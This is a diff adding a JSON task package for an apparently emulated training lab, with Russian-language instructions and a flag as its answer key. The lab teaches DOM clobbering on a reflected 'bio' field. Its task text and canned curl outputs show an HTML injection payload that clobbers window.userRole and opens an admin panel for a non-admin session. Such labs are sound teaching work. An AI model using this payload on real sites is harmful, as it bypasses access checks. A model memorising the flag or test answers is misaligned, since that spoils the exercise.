@@ -1,0 +1,42 @@
+{
+  "id": "web-dom-clobbering",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{d0m_cl0bb3r1ng_us3rR0l3}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: DOM clobbering ломает проверку роли\n\nПрофиль на `target.local/profile` отражает поле `bio` без экранирования HTML.\n\n1. Убедись, что теги проходят:\n\n   curl -s 'https://target.local/profile?bio=<a id=foo>x</a>' -b 'session=me'\n\n2. Код проверяет `if (window.userRole) { showAdminPanel(); }`. Через **named\n   access** тег с `id=\"userRole\"` станет значением `window.userRole` (объект —\n   truthy), и проверка пройдёт без единой строки JS.\n\n3. Отправь инъекцию и сохрани ответ:\n\n   curl -s 'https://target.local/profile?bio=<img id=userRole>' -b 'session=me' > found.txt\n\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция target.local)",
+      "cases": [
+        {
+          "match": "userrole",
+          "example": "-s 'https://target.local/profile?bio=<img id=userRole>' -b 'session=me'",
+          "output": "<div class=\"bio\"><img id=userRole></div>\n[clobber] window.userRole -> <img id=userRole> (truthy object)\n[app] if (window.userRole) showAdminPanel()\n[admin] panel rendered for non-admin session\nnto{d0m_cl0bb3r1ng_us3rR0l3}\n"
+        },
+        {
+          "match": "bio=|profile",
+          "example": "-s 'https://target.local/profile?bio=<a id=foo>x</a>' -b 'session=me'",
+          "output": "<div class=\"bio\"><a id=foo>x</a></div>\n"
+        },
+        {
+          "match": "target\\.local",
+          "example": "-s https://target.local/",
+          "output": "<!doctype html><title>target.local</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется target.local.\n"
+    }
+  }
+}
